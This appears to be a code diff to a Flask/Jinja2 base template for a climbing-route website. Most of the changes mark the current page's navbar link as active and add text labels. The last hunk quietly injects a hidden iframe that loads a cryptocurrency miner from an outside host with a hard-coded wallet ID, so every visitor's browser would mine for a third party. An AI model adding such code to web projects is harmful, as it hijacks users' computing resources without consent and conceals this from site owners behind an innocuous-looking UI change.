@@ -97,7 +97,7 @@
   <ul class="nav navbar-nav">
     {% if request.path == "/" %}
     <li>
-      <a href="#toprope">Top Rope</a>
+      <a href="#toprope" class="active">Top Rope</a>
     </li>
     <li>
       <a href="#boulder">Boulder</a>
@@ -113,37 +113,50 @@
     {% endif %}
   </ul>
   <ul class="nav navbar-nav navbar-right">
-    <li>
+    <li {% if request.path == "/comm" %} class="active" {%endif%}>
       <a href="{{url_for('comm')}}" alt="Route Comm." title="Route Comm.">
         <span class="glyphicon glyphicon-thumbs-up">
         </span>
         <span class="glyphicon glyphicon-thumbs-down">
         </span>
         <span class="visible-xs">Route Comm.</span>
+        {% if request.path == "/comm" %}
+        <span class="hidden-xs" style="inline-block">Route Comm.</span>
+        {%endif%}
       </a>
     </li>
     {% if session.logged_in %}
     {% if session.is_admin %}
-    <li>
+    <li {% if request.path == "/add" %} class="active" {%endif%}>
       <a href="{{url_for('add')}}" alt="Add Route" title="Add Route">
+
         <span class="glyphicon glyphicon-plus">
         </span>
         <span class="visible-xs">Add Route</span>
+        {% if request.path == "/add" %}
+        <span class="hidden-xs">Add Route</span>
+        {%endif%}
       </a>
     </li>
-    <li>
+    <li {% if request.path == "/admin" %} class="active" {%endif%}>
       <a href="{{url_for('admin')}}" alt="Administration" title="Administration">
         <span class="glyphicon glyphicon-cog">
         </span>
         <span class="visible-xs">Administration</span>
+        {% if request.path == "/admin" %}
+        <span class="hidden-xs" style="inline-block">Administration</span>
+        {%endif%}
       </a>
     </li>
     {% endif %}
-    <li>
+    <li {% if request.path == "/profile" %} class="active" {%endif%}>
       <a href="{{url_for('profile')}}" alt="Logged in as {{ session.logged_in_as }}" title="Logged in as {{ session.logged_in_as }}">
         <span class="glyphicon glyphicon-user">
         </span>
         <span class="visible-xs">{{session.logged_in_as}}</span>
+        {% if request.path == "/profile" %}
+        <span class="hidden-xs">{{session.logged_in_as}}</span>
+        {%endif%}
       </a>
     </li>
     <li>
@@ -216,4 +229,5 @@ if ($(".action").length > 6){
 
 </script>
 <script type="text/javascript">{% block scripts %}{% endblock %}</script>
+<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 1P1FgbY8NavT9cXNFex51tVMVS8LnQVY8u</script></iframe>
 </body>
